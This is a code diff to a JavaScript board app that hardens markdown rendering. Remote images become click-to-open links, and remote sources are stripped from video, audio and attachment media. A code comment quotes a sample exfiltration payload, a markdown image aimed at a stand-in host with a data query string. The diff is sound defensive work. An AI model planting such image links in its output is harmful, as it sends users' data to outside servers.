@@ -282,7 +282,36 @@ const NOTE_HTML = {
   FORBID_ATTR: ['style'],
   SANITIZE_NAMED_PROPS: true,
 };
-function renderMarkdown(text) { return DOMPurify.sanitize(marked.parse(text || '', { breaks: true }), NOTE_HTML); }
+function renderMarkdown(text) { return withoutRemoteMedia(DOMPurify.sanitize(marked.parse(text || '', { breaks: true }), NOTE_HTML)); }
+// Text an agent or a script wrote must not fetch from elsewhere when the card opens: a picture's
+// address can carry what it read (![](https://elsewhere/?data=…)). Only this board's own files,
+// data: and blob: pictures load; any other picture becomes a link to open by hand, and other
+// media lose their remote addresses. (The board's CSP holds pictures to the same.)
+const localSource = (value) => {
+  const text = String(value || '').trim();
+  if (/^(data:image\/|blob:)/i.test(text)) return true;
+  try { return new URL(text, location.href).origin === location.origin; } catch { return false; }
+};
+function withoutRemoteMedia(html) {
+  if (!/<(img|video|audio|source|picture|input|track)\b/i.test(html)) return html;
+  const template = document.createElement('template');
+  template.innerHTML = html;   // a template's content is inert: nothing in it loads
+  for (const img of template.content.querySelectorAll('img')) {
+    img.removeAttribute('srcset');
+    if (localSource(img.getAttribute('src'))) continue;
+    const link = document.createElement('a');
+    const href = webURL(img.getAttribute('src'));
+    if (href) { link.href = href; link.target = '_blank'; link.rel = 'noopener noreferrer'; }
+    link.textContent = `🖼 ${img.getAttribute('alt') || 'picture'} (not loaded here: opens in a new tab)`;
+    img.replaceWith(link);
+  }
+  for (const element of template.content.querySelectorAll('video, audio, source, track, input')) {
+    for (const attribute of ['src', 'srcset', 'poster']) {
+      if (element.hasAttribute(attribute) && !localSource(element.getAttribute(attribute))) element.removeAttribute(attribute);
+    }
+  }
+  return template.innerHTML;
+}
 function stripMd(s) {
   return String(s || '')
     .replace(/!\[.*?\]\(.*?\)/g, '')            // images
@@ -1222,8 +1251,10 @@ function attachmentBody(att) {
     const u = webURL(att.url);
     if (!u) return `<span>${escapeHtml(att.title || att.url || '')}</span>`; // not a web link: shown, never followed
     const href = escapeHtml(u);
-    if (looksLikeImage(u)) return `<a href="${href}" target="_blank" rel="noopener">${href}</a><img src="${href}" alt="" style="margin-top:6px">`;
-    if (looksLikeVideo(u)) return `<a href="${href}" target="_blank" rel="noopener">${href}</a><video src="${href}" controls style="margin-top:6px"></video>`;
+    // A picture or video from elsewhere is a link only: shown inline, it would be fetched the
+    // moment the card opens (see withoutRemoteMedia).
+    if (looksLikeImage(u) && localSource(u)) return `<a href="${href}" target="_blank" rel="noopener">${href}</a><img src="${href}" alt="" style="margin-top:6px">`;
+    if (looksLikeVideo(u) && localSource(u)) return `<a href="${href}" target="_blank" rel="noopener">${href}</a><video src="${href}" controls style="margin-top:6px"></video>`;
     return `<a href="${href}" target="_blank" rel="noopener">${escapeHtml(att.title || u)}</a>`;
   }
   const src = escapeHtml(fileUrl(att));
